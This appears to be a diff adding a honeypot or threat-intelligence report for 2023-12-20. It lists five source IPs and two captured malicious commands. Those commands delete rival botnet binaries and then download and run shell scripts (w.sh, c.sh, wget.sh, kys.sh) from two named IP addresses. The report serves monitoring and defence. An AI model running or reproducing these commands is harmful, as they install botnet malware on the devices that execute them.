@@ -1,0 +1,11 @@
+Top 5 IPs for 2023-12-20:
+
+172.177.245.62
+122.19.25.254
+124.94.112.44
+93.41.166.10
+122.116.17.236
+
+Malicious commands seen:
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *Sakura*; rm -rf *mips*; rm -rf *dotsh-linux* ;rm -rf *mpsl*;rm -rf *ppc*;rm -rf *sh4*;rm -rf *m68k*; rm -rf *arm7*; rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*;rm -rf *x86*;rm -rf *x86_64*;busybox wget http://103.178.235.42/w.sh; sh w.sh; curl http://103.178.235.42/c.sh; sh c.sh; wget http://103.178.235.42/wget.sh; sh wget.sh; curl http://103.178.235.42/wget.sh; sh wget.sh; busybox wget http://103.178.235.42/wget.sh; sh wget.sh; busybox curl http://103.178.235.42/wget.sh; sh wget.sh
+/shell?cd+/tmp;rm+kys.sh;wget+http:/\\/166.0.255.125/kys.sh;chmod+777+kys.sh;./kys.sh;wget+http:/\\/166.0.255.125/kys.sh;chmod+777+kys.sh;./kys.sh
